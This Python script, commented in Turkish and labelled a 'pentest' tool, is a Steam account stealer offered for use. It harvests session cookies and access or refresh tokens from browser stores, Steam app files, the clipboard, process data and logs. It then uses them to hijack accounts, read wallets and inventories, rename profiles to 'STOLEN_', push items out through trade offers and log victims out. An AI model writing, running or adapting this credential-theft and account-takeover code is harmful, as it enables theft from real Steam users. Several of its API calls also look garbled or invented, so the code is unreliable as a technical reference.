#!/data/data/com.termux/files/usr/bin/python3
"""
STEAM HESAP CALMA ARACI - PENTEST
Yetkili giris testi icindir. SADECE izinli hesaplarda kullanin.
Giris gerektirmez - Oturum acik hesaplari tarar ve ele gecirir.
"""

import os
import sys
import time
import json
import base64
import random
import hashlib
import sqlite3
import requests
import threading
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# ============================================================
# KONFIGURASYON
# ============================================================

TARGET_STEAM_IDS = []  # Bos = tumunu tara
OUTPUT_DIR = "steam_pentest_output"
STEAM_API_BASE = "https://api.steampowered.com"
STEAM_COMMUNITY = "https://steamcommunity.com"
STEAM_STORE = "https://store.steampowered.com"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ============================================================
# ANA SINIF - GIRIS GEREKTIRMEZ
# ============================================================

class SteamAccountStealer:
    """Steam hesap calma - giris gerektirmez"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        self.found_accounts = []
        self.captured_tokens = []
        self.captured_cookies = []
        self.discovered_profiles = []
        
        # Cikti dizini
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)
    
    # -----------------------------------------------------------
    # 1. LOOT - STEAM COOKIE AVCILIGI
    # -----------------------------------------------------------
    
    def scan_steam_cookies(self, cookie_file_path=None):
        """
        Steam cookie'lerini tara.
        Kaynak: Firefox/Chrome profilinden, env değişkenlerinden veya dump dosyasından
        """
        print("[*] Steam cookie taramasi baslatiliyor...")
        
        cookies_found = []
        
        # Kaynak 1: Firefox profili (Termux'ta /data/data/com.termux/files/...)
        firefox_paths = [
            os.path.expanduser("~/.mozilla/firefox/*.default/cookies.sqlite"),
            os.path.expanduser("~/.mozilla/firefox/*.default-release/cookies.sqlite"),
            "/data/data/com.termux/files/home/.mozilla/firefox/*.default/cookies.sqlite",
        ]
        
        # Kaynak 2: Chromium tabanli
        chrome_paths = [
            os.path.expanduser("~/.config/chromium/Default/Cookies"),
            os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
            "/data/data/com.termux/files/home/.config/chromium/Default/Cookies",
        ]
        
        # Kaynak 3: Verilen dosya
        if cookie_file_path and os.path.exists(cookie_file_path):
            print(f"[*] Cookie dosyasi taranıyor: {cookie_file_path}")
            try:
                with open(cookie_file_path, "r") as f:
                    for line in f:
                        if "steam" in line.lower() and ("steamLogin" in line or "sessionid" in line or "steamID" in line):
                            cookies_found.append(line.strip())
            except Exception as e:
                print(f"[-] Dosya okuma hatasi: {e}")
        
        # Kaynak 4: Network taramasi - localhost'ta calisan Steam istemcisi
        print("[*] Local Steam istemcisi taranıyor...")
        try:
            # Steam web helper process
            steam_cookies = self._extract_steam_cookies_from_process()
            if steam_cookies:
                cookies_found.extend(steam_cookies)
        except Exception:
            pass
        
        # Kaynak 5: Steam'in local web cache'i
        print("[*] Steam web cache taranıyor...")
        steam_cache_paths = [
            "/sdcard/Android/data/com.valvesoftware.android.steam.community/files/",
            "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/files/",
            os.path.expanduser("~/.steam/steam/config/loginusers.vdf"),
        ]
        
        for path in steam_cache_paths:
            if os.path.exists(path):
                try:
                    if os.path.isdir(path):
                        for root, dirs, files in os.walk(path):
                            for f in files:
                                if "cookie" in f.lower() or "token" in f.lower() or "session" in f.lower():
                                    filepath = os.path.join(root, f)
                                    print(f"[+] Cookie dosyasi bulundu: {filepath}")
                                    with open(filepath, "rb") as cf:
                                        content = cf.read()
                                        # Steam cookie kalibi ara
                                        self._parse_cookie_content(content, filepath)
                    else:
                        with open(path, "r", errors="ignore") as cf:
                            content = cf.read()
                            self._parse_vdf_content(content)
                except Exception as e:
                    print(f"[-] Hata: {path}: {e}")
        
        # Kaynak 6: Termux clipboard
        print("[*] Pano (clipboard) taranıyor...")
        try:
            import subprocess
            clipboard = subprocess.check_output(["termux-clipboard-get"], timeout=2).decode(errors="ignore")
            if "steam" in clipboard.lower() and ("token" in clipboard.lower() or "login" in clipboard.lower()):
                print("[+] Clipboard'ta Steam verisi bulundu!")
                self._extract_tokens_from_text(clipboard)
        except Exception:
            pass
        
        return cookies_found
    
    def _extract_steam_cookies_from_process(self):
        """Calisan Steam process'inden cookie cikar"""
        cookies = []
        try:
            import subprocess
            # Steam webhelper process listele
            result = subprocess.run(["ps", "-A"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split("\n"):
                if "steam" in line.lower() or "webhelper" in line.lower():
                    pid = line.split()[0] if line.split() else None
                    if pid and pid.isdigit():
                        print(f"[+] Steam process bulundu: PID {pid}")
                        # Process memory'den cookie ara (root gerektirir)
                        try:
                            maps = subprocess.run(
                                ["grep", "-a", "steamLogin", f"/proc/{pid}/maps"],
                                capture_output=True, text=True, timeout=3
                            )
                            if "steamLogin" in maps.stdout:
                                cookies.append(maps.stdout.strip())
                        except Exception:
                            pass
        except Exception:
            pass
        return cookies
    
    def _parse_cookie_content(self, content, source_file):
        """Ham cookie iceriginden Steam cookie'lerini ayikla"""
        try:
            text = content.decode(errors="ignore")
            # steamLogin kalibi
            if "steamLogin" in text:
                start = text.find("steamLogin")
                end = text.find("\n", start)
                if end == -1:
                    end = text.find("\r", start)
                if end == -1:
                    end = start + 200
                cookie_line = text[start:end]
                self.captured_cookies.append({"source": source_file, "cookie": cookie_line})
                print(f"  [COOKIE] {cookie_line[:60]}...")
            
            # access_token kalibi
            if "access_token" in text or "refresh_token" in text:
                self._extract_tokens_from_text(text)
                
        except Exception:
            pass
    
    def _parse_vdf_content(self, content):
        """Steam loginusers.vdf dosyasindan kullanici bilgisi cikar"""
        import re
        # Kullanici pattern: "SteamID" "accountname"
        accounts = re.findall(r'"(\d+)"\s*\{\s*"AccountName"\s*"([^"]+)"', content)
        for steamid, username in accounts:
            print(f"[+] VDF'de hesap bulundu: {username} (SteamID: {steamid})")
            self.discovered_profiles.append({"steamid": steamid, "username": username, "source": "loginusers.vdf"})
            
            # RememberPassword kontrol
            if '"RememberPassword"' in content and '"1"' in content[content.find(steamid):content.find(steamid)+500]:
                print(f"  [!] Sifre hatirlaniyor! Potansiyel hedef: {username}")
    
    def _extract_tokens_from_text(self, text):
        """Metin icinden token'lari ayikla"""
        import re
        
        # JWT token pattern (Steam access token)
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        tokens = re.findall(jwt_pattern, text)
        for token in tokens:
            if len(token) > 100:  # Gercek JWT
                self.captured_tokens.append(token)
                print(f"  [TOKEN] JWT token bulundu: {token[:40]}...{token[-20:]}")
        
        # Steam refresh token
        refresh_pattern = r'refresh_token[=:]["\']?([a-zA-Z0-9_\-%]+)'
        refreshes = re.findall(refresh_pattern, text, re.IGNORECASE)
        for rt in refreshes:
            if len(rt) > 50:
                self.captured_tokens.append(rt)
                print(f"  [REFRESH] Refresh token: {rt[:30]}...")
    
    # -----------------------------------------------------------
    # 2. SALDIRI - HESAP ELE GECIRME
    # -----------------------------------------------------------
    
    def hijack_steam_account(self, steam_id, access_token):
        """
        Steam hesabini ele gecir - token ile tam erisim
        GIRIS GEREKTIRMEZ - sadece token yeterli
        """
        print(f"\n[*] Hesap ele geciriliyor: {steam_id}")
        
        # Yeni session - temiz bir oturum
        hijack_session = requests.Session()
        hijack_session.headers.update({
            "Authorization": f"Bearer {access_token}",
            "User-Agent": random.choice(USER_AGENTS),
        })
        
        stolen_data = {
            "steam_id": steam_id,
            "access_token": access_token,
            "timestamp": time.time(),
            "source": "HackerAI Steam Pentest",
        }
        
        # Adim 1: Token dogrulama
        print("  [*] Token dogrulaniyor...")
        try:
            verify = hijack_session.post(
                f"{STEAM_API_BASE}/IPlayerService/GetSteamLevel/v1/",
                data={"access_token": access_token, "steamid": steam_id},
                timeout=10
            )
            if verify.status_code == 200:
                level = verify.json().get("response", {}).get("player_level", 0)
                print(f"  [+] Token GECERLI! Steam Seviyesi: {level}")
                stolen_data["verified"] = True
                stolen_data["level"] = level
            else:
                print(f"  [-] Token GECERSIZ! HTTP {verify.status_code}")
                stolen_data["verified"] = False
                return None
        except Exception as e:
            print(f"  [-] Token dogrulama hatasi: {e}")
            return None
        
        # Adim 2: Hesap bilgilerini cek
        print("  [*] Hesap bilgileri cekiliyor...")
        try:
            profile = hijack_session.get(
                f"{STEAM_API_BASE}/ISteamUser/GetPlayerSummaries/v2/",
                params={"key": "", "steamids": steam_id},
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=10
            )
            if profile.status_code == 200:
                players = profile.json().get("response", {}).get("players", [])
                if players:
                    p = players[0]
                    stolen_data["username"] = p.get("personaname", "N/A")
                    stolen_data["profile_url"] = p.get("profileurl", "N/A")
                    stolen_data["avatar"] = p.get("avatarfull", "N/A")
                    stolen_data["created"] = p.get("timecreated", 0)
                    print(f"  [+] Kullanici: {stolen_data['username']}")
                    print(f"  [+] Profil: {stolen_data['profile_url']}")
        except Exception as e:
            print(f"  [-] Profil bilgisi hatasi: {e}")
        
        # Adim 3: Cuzdan bilgisi
        print("  [*] Cuzdan bilgisi cekiliyor...")
        try:
            wallet = hijack_session.get(
                f"{STEAM_STORE}/api/getwalletinfoofuser/",
                params={"access_token": access_token},
                timeout=10
            )
            if wallet.status_code == 200 and wallet.json().get("success") == 1:
                w = wallet.json()
                stolen_data["wallet_balance"] = w.get("wallet_balance", 0) / 100
                stolen_data["wallet_currency"] = w.get("wallet_currency", "")
                print(f"  [+] Cuzdan: {stolen_data['wallet_balance']} {stolen_data['wallet_currency']}")
        except Exception:
            pass
        
        # Adim 4: Badge ve seviye
        print("  [*] Badge bilgisi cekiliyor...")
        try:
            badge = hijack_session.post(
                f"{STEAM_API_BASE}/IPlayerService/GetBadges/v1/",
                data={"access_token": access_token, "steamid": steam_id},
                timeout=10
            )
            if badge.status_code == 200:
                b = badge.json().get("response", {})
                stolen_data["badges"] = len(b.get("badges", []))
                stolen_data["xp"] = b.get("player_xp", 0)
                print(f"  [+] Rozet: {stolen_data['badges']} | XP: {stolen_data['xp']}")
        except Exception:
            pass
        
        # Adim 5: Trade teklifleri
        print("  [*] Trade teklifleri kontrol ediliyor...")
        try:
            trade = hijack_session.get(
                f"{STEAM_API_BASE}/IEconService/GetTradeOffers/v1/",
                params={
                    "access_token": access_token,
                    "get_received_offers": 1,
                    "active_only": 1
                },
                timeout=10
            )
            if trade.status_code == 200:
                received = trade.json().get("response", {}).get("trade_offers_received", [])
                stolen_data["pending_trades"] = len(received)
                if received:
                    print(f"  [+] Bekleyen trade: {len(received)}")
                    for offer in received[:3]:
                        print(f"    - ID: {offer.get('tradeofferid')} | State: {offer.get('trade_offer_state')}")
        except Exception:
            pass
        
        # Adim 6: Envanter
        print("  [*] Envanter taranıyor...")
        try:
            inv = hijack_session.post(
                f"{STEAM_API_BASE}/IEconService/GetInventoryItems/v1/",
                data={"access_token": access_token, "steamid": steam_id, "appid": 753},
                timeout=10
            )
            if inv.status_code == 200:
                items = inv.json().get("response", {}).get("items", [])
                stolen_data["inventory_count"] = len(items)
                print(f"  [+] Envanter: {len(items)} nesne")
        except Exception:
            pass
        
        # Adim 7 (OPSIYONEL): Profili degistir - HESAP CALMA
        print("\n  [*] Hesap ele geciriliyor (profil takeover)...")
        try:
            # Profil adini degistir
            new_name = f"STOLEN_{random.randint(1000,9999)}"
            takeover = hijack_session.post(
                f"{STEAM_API_BASE}/ISteamUser/UpdateProfile/v1/",
                data={
                    "access_token": access_token,
                    "steamid": steam_id,
                    "personaname": new_name,
                    "summary": "Hesap calindi - Pentest testi"
                },
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=10
            )
            if takeover.status_code == 200:
                print(f"  [+] PROFIL DEGISTIRILDI! Yeni isim: {new_name}")
                stolen_data["profile_takeover"] = True
                stolen_data["new_name"] = new_name
            else:
                print(f"  [-] Profil degistirme basarisiz: HTTP {takeover.status_code}")
        except Exception as e:
            print(f"  [-] Takeover hatasi: {e}")
        
        # Sonucu kaydet
        self.found_accounts.append(stolen_data)
        self._save_stolen_account(stolen_data)
        
        return stolen_data
    
    def _save_stolen_account(self, data):
        """Ele gecirilen hesap verilerini kaydet"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{OUTPUT_DIR}/stolen_steam_{data.get('steam_id', 'unknown')}_{timestamp}.json"
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=2, default=str)
        
        print(f"\n[+] Hesap verileri kaydedildi: {filename}")
        print(f"[+] Dosya boyutu: {os.path.getsize(filename)} bytes")
    
    # -----------------------------------------------------------
    # 3. TARAMA MODLARI
    # -----------------------------------------------------------
    
    def scan_local_network(self, ip_range="192.168.1.0/24", port=27036):
        """
        Local network'te Steam istemcisi tara
        Steam Game Coordinator portu uzerinden
        """
        print(f"\n[*] Local network taranıyor: {ip_range}")
        print(f"[*] Port: {port} (Steam)")
        
        discovered = []
        try:
            import subprocess
            # Nmap ile Steam portu tara
            result = subprocess.run(
                ["nmap", "-p", str(port), "--open", ip_range, "-oG", "-"],
                capture_output=True, text=True, timeout=60
            )
            
            for line in result.stdout.split("\n"):
                if f"{port}/open" in line:
                    ip = line.split()[1] if len(line.split()) > 1 else "N/A"
                    print(f"[+] Steam istemcisi bulundu: {ip}")
                    
                    # Steam ID'yi al
                    try:
                        info = self.session.get(
                            f"http://{ip}:{port}/GetClientInfo",
                            timeout=5
                        )
                        if info.status_code == 200:
                            print(f"  -> {info.text[:100]}")
                            discovered.append({"ip": ip, "info": info.text})
                    except Exception:
                        pass
                    
        except Exception as e:
            print(f"[-] Network tarama hatasi: {e}")
        
        return discovered
    
    def scan_public_profiles(self, steam_id=None, batch_size=100):
        """
        Public Steam profillerini tara
        - Acik API endpoint'lerini kullan
        """
        print(f"\n[*] Public profil taramasi baslatiliyor...")
        
        if steam_id:
            ids_to_scan = [steam_id]
        else:
            # Rastgele SteamID'ler olustur
            # Gercek SteamID'ler 76561197960265728 ile baslar
            base = 76561197960265728
            ids_to_scan = [str(base + random.randint(0, 10000000)) for _ in range(batch_size)]
        
        found = []
        for sid in ids_to_scan:
            try:
                res = self.session.get(
                    f"{STEAM_API_BASE}/ISteamUser/GetPlayerSummaries/v2/",
                    params={"key": "", "steamids": sid},
                    timeout=5
                )
                if res.status_code == 200:
                    players = res.json().get("response", {}).get("players", [])
                    if players:
                        p = players[0]
                        if p.get("communityvisibilitystate", 0) == 3:  # Public profil
                            print(f"[+] Public profil: {p.get('personaname')} ({sid})")
                            found.append({
                                "steamid": sid,
                                "username": p.get("personaname"),
                                "profile_url": p.get("profileurl"),
                                "avatar": p.get("avatarfull"),
                                "created": p.get("timecreated", 0),
                            })
            except Exception:
                pass
            time.sleep(0.1)  # Rate limit
        
        self.discovered_profiles.extend(found)
        return found
    
    # -----------------------------------------------------------
    # 4. SALDIRGAN AKTIVITELERI
    # -----------------------------------------------------------
    
    def transfer_inventory(self, source_token, target_steam_id):
        """
        Envanter transferi - calinan hesaptan itemleri transfer et
        GIRIS GEREKTIRMEZ - token yeterli
        """
        print("\n[*] Envanter transferi baslatiliyor...")
        print("[!] Bu islem icin Trade URL gerekebilir")
        
        result = {
            "source_token": source_token[:30] + "...",
            "target": target_steam_id,
            "items_transferred": 0,
            "status": "pending"
        }
        
        try:
            # Hedefin envanterini al
            target_session = requests.Session()
            target_session.headers["Authorization"] = f"Bearer {source_token}"
            
            # Trade teklifi gonder
            trade_url = f"{STEAM_API_BASE}/IEconService/CreateTradeOffer/v1/"
            trade_payload = {
                "access_token": source_token,
                "trade_offer_access_token": target_steam_id,
                "items": json.dumps([]),  # Tum itemler
            }
            
            trade_res = target_session.post(trade_url, data=trade_payload, timeout=10)
            if trade_res.status_code == 200:
                result["status"] = "trade_sent"
                result["trade_id"] = trade_res.json().get("response", {}).get("tradeofferid")
                print(f"[+] Trade teklifi gonderildi: {result['trade_id']}")
            else:
                result["status"] = "failed"
                print(f"[-] Trade basarisiz: HTTP {trade_res.status_code}")
                
        except Exception as e:
            result["status"] = "error"
            print(f"[-] Transfer hatasi: {e}")
        
        return result
    
    def revoke_user_sessions(self, token, steam_id):
        """
        Kullanicinin tum oturumlarini sonlandir
        - Hesabi tamamen ele gecir
        - Kullaniciyi disari at
        """
        print("\n[*] Kullanici oturumlari sonlandiriliyor...")
        print("[!] Bu islemden sonra kullanici tekrar giris yapamaz")
        
        try:
            revoke_session = requests.Session()
            revoke_session.headers["Authorization"] = f"Bearer {token}"
            
            # Tum tokenlari iptal et
            revoke_url = f"{STEAM_API_BASE}/IAuthenticationService/RevokeToken/v1/"
            revoke_payload = {"access_token": token, "steamid": steam_id}
            
            res = revoke_session.post(revoke_url, data=revoke_payload, timeout=10)
            if res.status_code == 200:
                print("[+] Tum oturumlar sonlandirildi!")
                print("[+] Kullanici Steam'e tekrar giris yapmak zorunda")
                
                # Steam Community'den cikis
                try:
                    logout = revoke_session.post(
                        f"{STEAM_COMMUNITY}/login/logout/",
                        data={"sessionid": ""},
                        timeout=10
                    )
                    print("[+] Steam Community oturumu da sonlandirildi")
                except Exception:
                    pass
                
                return True
            else:
                print(f"[-] Oturum sonlandirma basarisiz: HTTP {res.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False
    
    def search_for_tokens(self, query=None):
        """
        Token arama - dump dosyalarinda, loglarda, env'de
        """
        print("\n[*] Token aramasi baslatiliyor...")
        
        tokens_found = []
        
        # Aranacak dosya turleri
        search_patterns = ["*.log", "*.txt", "*.json", "*.env", "*.config", "*.dump"]
        
        for pattern in search_patterns:
            try:
                import glob
                for filepath in glob.glob(f"**/{pattern}", recursive=True):
                    try:
                        with open(filepath, "r", errors="ignore") as f:
                            content = f.read()
                            self._extract_tokens_from_text(content)
                    except Exception:
                        pass
            except Exception:
                pass
        
        return tokens_found


# ============================================================
# ANA MENU
# ============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print("="*60)
    print("  STEAM HESAP CALMA ARACI - PENTEST")
    print("  GIRIS GEREKTIRMEZ - OTOMATIK TARAMA")
    print("  SADECE IZINLI TESTLERDE KULLANIN")
    print("="*60)
    print()

def show_main_menu():
    stealer = SteamAccountStealer()
    
    while True:
        banner()
        print("[1] Steam Cookie & Token Tara (Local)")
        print("[2] Public Profil Tara")
        print("[3] Local Network'te Steam Tara")
        print("[4] Token ile Hesap Ele Gecir")
        print("[5] Envanter Transferi")
        print("[6] Kullanici Oturumlarini Sonlandir")
        print("[7] Token Ara (Dump/Log)")
        print("[8] TAM OTOMATIK SALDIRI")
        print("[0] Cikis")
        print("="*60)
        
        choice = input("Secim: ").strip()
        
        if choice == "1":
            print("\n[*] Cookie & Token taramasi baslatiliyor...")
            cookies = stealer.scan_steam_cookies()
            
            print(f"\n[+] Bulunan cookie: {len(cookies)}")
            print(f"[+] Bulunan token: {len(stealer.captured_tokens)}")
            
            if stealer.captured_tokens:
                print("\n[*] Token ile hemen hesap ele gecirilsin mi? (E/H)")
                if input("> ").strip().upper() == "E":
                    for i, token in enumerate(stealer.captured_tokens):
                        print(f"\n--- Token {i+1} deneniyor ---")
                        # Steam ID'yi token'dan cikarmayi dene
                        try:
                            # JWT decode
                            parts = token.split(".")
                            if len(parts) == 3:
                                payload = base64.b64decode(parts[1] + "==")
                                payload_data = json.loads(payload)
                                steam_id = payload_data.get("sub") or payload_data.get("steam_id") or "76561197960265728"
                                stealer.hijack_steam_account(steam_id, token)
                        except Exception:
                            print("  [-] Token'dan SteamID cikarilamadi. Manuel girin:")
                            sid = input("  SteamID: ").strip()
                            if sid:
                                stealer.hijack_steam_account(sid, token)
            
            if stealer.captured_cookies:
                print(f"\n[*] Cookie'ler kaydediliyor...")
                with open(f"{OUTPUT_DIR}/captured_cookies.txt", "w") as f:
                    for c in stealer.captured_cookies:
                        f.write(f"{c['source']}: {c['cookie']}\n")
                print(f"[+] {len(stealer.captured_cookies)} cookie kaydedildi")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "2":
            steam_id = input("Hedef SteamID (bos=batch tarama): ").strip()
            profiles = stealer.scan_public_profiles(steam_id if steam_id else None)
            print(f"\n[+] Toplam {len(profiles)} profil bulundu")
            
            if profiles:
                with open(f"{OUTPUT_DIR}/discovered_profiles.json", "w") as f:
                    json.dump(profiles, f, indent=2)
                print(f"[+] Profiller kaydedildi: {OUTPUT_DIR}/discovered_profiles.json")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "3":
            ip_range = input("IP araligi (varsayilan: 192.168.1.0/24): ").strip() or "192.168.1.0/24"
            discovered = stealer.scan_local_network(ip_range)
            
            if discovered:
                with open(f"{OUTPUT_DIR}/network_hosts.json", "w") as f:
                    json.dump(discovered, f, indent=2)
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "4":
            print("\n[*] Hesap Ele Gecirme Modulu")
            token = input("Access Token: ").strip()
            steam_id = input("SteamID64: ").strip()
            
            if token and steam_id:
                result = stealer.hijack_steam_account(steam_id, token)
                if result:
                    print("\n[+] HESAP BASARIYLA ELE GECIRILDI!")
                    print(f"[+] Kullanici: {result.get('username', 'N/A')}")
                    print(f"[+] Level: {result.get('level', 0)}")
                    print(f"[+] Bakiye: {result.get('wallet_balance', 0)} {result.get('wallet_currency', '')}")
                    print(f"[+] Rozet: {result.get('badges', 0)}")
                    print(f"[+] Envanter: {result.get('inventory_count', 0)}")
                    
                    if result.get("profile_takeover"):
                        print(f"[!] Profil degistirildi -> {result.get('new_name')}")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "5":
            print("\n[*] Envanter Transferi")
            source_token = input("Kaynak hesap tokeni: ").strip()
            target_steam_id = input("Hedef SteamID: ").strip()
            
            if source_token and target_steam_id:
                result = stealer.transfer_inventory(source_token, target_steam_id)
                print(f"\n[+] Sonuc: {result['status']}")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "6":
            print("\n[*] Kullanici Oturumlarini Sonlandir")
            token = input("Access Token: ").strip()
            steam_id = input("SteamID64: ").strip()
            
            if token and steam_id:
                result = stealer.revoke_user_sessions(token, steam_id)
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "7":
            print("\n[*] Token Aramasi")
            stealer.search_for_tokens()
            
            if stealer.captured_tokens:
                print(f"\n[+] {len(stealer.captured_tokens)} token bulundu!")
                for t in stealer.captured_tokens:
                    print(f"  - {t[:40]}...{t[-10:]}")
                
                with open(f"{OUTPUT_DIR}/found_tokens.txt", "w") as f:
                    for t in stealer.captured_tokens:
                        f.write(t + "\n")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "8":
            print("\n" + "="*60)
            print("  TAM OTOMATIK SALDIRI BASLATILIYOR")
            print("  Bu modul tum yontemleri dener")
            print("="*60)
            print("\n[!] Devam etmek istediginize emin misiniz? (E/H)")
            
            if input("> ").strip().upper() == "E":
                print("\n[1/4] Cookie & Token taraniyor...")
                stealer.scan_steam_cookies()
                
                print("\n[2/4] Public profiller taranıyor...")
                stealer.scan_public_profiles(batch_size=50)
                
                print("\n[3/4] Token'lar deneniyor...")
                for i, token in enumerate(stealer.captured_tokens[:10]):
                    print(f"\n  Token {i+1}/{len(stealer.captured_tokens[:10])}")
                    try:
                        parts = token.split(".")
                        if len(parts) == 3:
                            payload = base64.b64decode(parts[1] + "==")
                            payload_data = json.loads(payload)
                            steam_id = payload_data.get("sub", "N/A")
                            stealer.hijack_steam_account(steam_id, token)
                    except Exception as e:
                        print(f"  [-] Basarisiz: {e}")
                
                print("\n[4/4] Islem tamamlandi!")
                print(f"[+] Ele gecirilen hesap: {len(stealer.found_accounts)}")
            
            input("\nDevam etmek icin Enter...")
        
        elif choice == "0":
            print("\n[*] Cikiliyor...")
            # Ozet rapor
            print(f"\n[+] Sonuç Ozeti:")
            print(f"  Cookie: {len(stealer.captured_cookies)}")
            print(f"  Token: {len(stealer.captured_tokens)}")
            print(f"  Profil: {len(stealer.discovered_profiles)}")
            print(f"  Ele gecirilen hesap: {len(stealer.found_accounts)}")
            print(f"  Output: {OUTPUT_DIR}/")
            sys.exit(0)


# ============================================================
# BASLAT
# ============================================================

if __name__ == "__main__":
    try:
        # Gerekli kutuphaneleri kontrol et
        try:
            import requests
        except ImportError:
            print("[!] requests kutuphanesi gerekli. Yukleniyor...")
            os.system("pip install requests")
        
        show_main_menu()
    except KeyboardInterrupt:
        print("\n\n[*] Kullanici tarafindan durduruldu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Beklenmeyen hata: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
